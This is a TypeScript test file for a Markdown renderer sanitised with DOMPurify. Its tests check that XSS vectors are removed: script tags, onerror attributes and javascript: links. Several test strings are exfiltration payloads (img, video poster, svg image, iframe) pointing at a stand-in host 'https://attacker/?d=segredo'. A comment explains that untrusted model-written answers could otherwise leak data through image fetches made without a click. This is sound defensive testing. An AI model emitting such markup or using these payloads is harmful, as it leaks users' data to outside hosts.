// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { renderMarkdown } from './markdown';

// Parses HTML through the DOM instead of matching substrings, since a
// substring check like `not.toContain('<script')` also passes for escaped
// text such as `&lt;script&gt;`, which proves nothing about the real risk.
function parse(html: string): HTMLElement {
  const el = document.createElement('div');
  el.innerHTML = html;
  return el;
}

describe('renderMarkdown', () => {
  it('renders bold text as <strong>', () => {
    const el = parse(renderMarkdown('**oi**'));
    expect(el.querySelector('strong')?.textContent).toBe('oi');
  });

  it('renders a fenced block as <pre><code> without interpreting its contents as Markdown', () => {
    const el = parse(renderMarkdown('```\n**not bold**\n```'));
    const code = el.querySelector('pre > code');
    expect(code?.textContent).toBe('**not bold**\n');
  });

  it('drops a <script> tag from the output', () => {
    const el = parse(renderMarkdown('<script>alert(1)</script>'));
    expect(el.querySelector('script')).toBeNull();
  });

  it('drops an onerror attribute from an <img>', () => {
    const el = parse(renderMarkdown('<img src=x onerror="alert(1)">'));
    expect(el.querySelector('img')?.hasAttribute('onerror')).toBe(false);
  });

  it('drops a javascript: href from a link', () => {
    const el = parse(renderMarkdown('[x](javascript:alert(1))'));
    const anchor = el.querySelector('a');
    // DOMPurify strips the unsafe attribute rather than the element, so the
    // link survives without its `href` at all.
    expect(anchor?.hasAttribute('href')).toBe(false);
  });

  it('returns a string without throwing for an unterminated fence (a streamed partial delta)', () => {
    expect(() => renderMarkdown('texto\n```bash\nnpm test')).not.toThrow();
    expect(typeof renderMarkdown('texto\n```bash\nnpm test')).toBe('string');
  });

  it('turns a single newline inside a paragraph into a <br> (breaks: true)', () => {
    const el = parse(renderMarkdown('linha um\nlinha dois'));
    expect(el.querySelector('br')).not.toBeNull();
  });

  it('keeps an image by default, which is what the notes preview renders', () => {
    const el = parse(renderMarkdown('![](https://exemplo/foto.png)'));
    expect(el.querySelector('img')?.getAttribute('src')).toBe('https://exemplo/foto.png');
  });

  it('drops an image on the markdownOnly path, so untrusted text cannot beacon out a GET', () => {
    // No CSP in this repo, so a remote image an answer chose the URL of would be fetched with no
    // click at all — the query string is whatever the model wrote.
    const el = parse(renderMarkdown('![](https://attacker/?d=segredo)', { markdownOnly: true }));
    expect(el.querySelector('img')).toBeNull();
  });

  it('drops a raw <img> tag too, not just Markdown image syntax', () => {
    const el = parse(renderMarkdown('<img src="https://attacker/?d=segredo">', { markdownOnly: true }));
    expect(el.querySelector('img')).toBeNull();
  });

  // Every one of these comes back from this DOMPurify version with `img` merely forbidden, which is
  // why the chat path is an allowlist instead: each is a GET of an address the model chose, made
  // without a click.
  const fetchers: [string, string, string][] = [
    ['a poster on a <video>', '<video poster="https://attacker/?d=segredo"></video>', 'video'],
    ['an <input type="image">', '<input type="image" src="https://attacker/?d=segredo">', 'input'],
    ['an <image> inside <svg>', '<svg><image href="https://attacker/?d=segredo"></image></svg>', 'svg, image'],
    ['a preloading <video src>', '<video src="https://attacker/?d=segredo" preload="auto"></video>', 'video'],
    ['an <iframe>', '<iframe src="https://attacker/?d=segredo"></iframe>', 'iframe'],
  ];
  for (const [what, markup, selector] of fetchers) {
    it(`renders nothing for ${what} in an answer`, () => {
      const el = parse(renderMarkdown(markup, { markdownOnly: true }));
      expect(el.querySelectorAll(selector)).toHaveLength(0);
    });
  }

  it('keeps everything Markdown legitimately produces: an allowlist that ate a table would be worse', () => {
    const el = parse(
      renderMarkdown(
        '# Título\n\n## Dois\n\ntexto **forte** *ênfase* ~~riscado~~ `inline` [link](https://exemplo "t")\n\n- um\n  - aninhado\n\n1. primeiro\n\n> citação\n\n---\n\n| a | b |\n| :- | -: |\n| 1 | 2 |\n\n```bash\nnpm test\n```\n',
        { markdownOnly: true },
      ),
    );

    expect(el.querySelector('h1')?.textContent).toBe('Título');
    expect(el.querySelector('h2')?.textContent).toBe('Dois');
    expect(el.querySelector('strong')?.textContent).toBe('forte');
    expect(el.querySelector('em')?.textContent).toBe('ênfase');
    expect(el.querySelector('del')?.textContent).toBe('riscado');
    const anchor = el.querySelector('a');
    expect(anchor?.getAttribute('href')).toBe('https://exemplo');
    expect(anchor?.getAttribute('title')).toBe('t');
    expect(el.querySelector('ul > li > ul > li')?.textContent).toBe('aninhado'); // nested lists survive
    expect(el.querySelector('ol > li')?.textContent).toBe('primeiro');
    expect(el.querySelector('blockquote p')?.textContent).toBe('citação');
    expect(el.querySelector('hr')).not.toBeNull();
    expect(el.querySelectorAll('table thead th')).toHaveLength(2);
    expect(el.querySelectorAll('table tbody td')).toHaveLength(2);
    expect(el.querySelector('table thead th')?.getAttribute('align')).toBe('left'); // GFM alignment kept
    const code = el.querySelector('pre > code');
    expect(code?.textContent).toBe('npm test\n');
    expect(code?.getAttribute('class')).toBe('language-bash');
  });

  it('renders a task list as plain bullets, since `input` is the tag being refused', () => {
    // The accepted cost of the allowlist: no checkbox, and the text of the item is still there.
    const el = parse(renderMarkdown('- [ ] tarefa\n- [x] feita', { markdownOnly: true }));

    expect(el.querySelector('input')).toBeNull();
    expect(Array.from(el.querySelectorAll('li')).map((li) => li.textContent?.trim())).toEqual(['tarefa', 'feita']);
  });

  it('never lets an anchor out carrying a target, on either path', () => {
    // A link that opens in a new tab keeps a handle on this one through `window.opener`. `target` is
    // not in DOMPurify's default attribute allowlist and is not in the chat path's either, so the
    // invariant is that it never arrives — this goes red the day someone allows it.
    for (const options of [undefined, { markdownOnly: true }, { markdownOnly: false }]) {
      const anchor = parse(renderMarkdown('<a href="https://exemplo" target="_blank">x</a>', options)).querySelector('a');
      expect(anchor?.hasAttribute('target')).toBe(false);
    }
  });

  it('returns the empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});
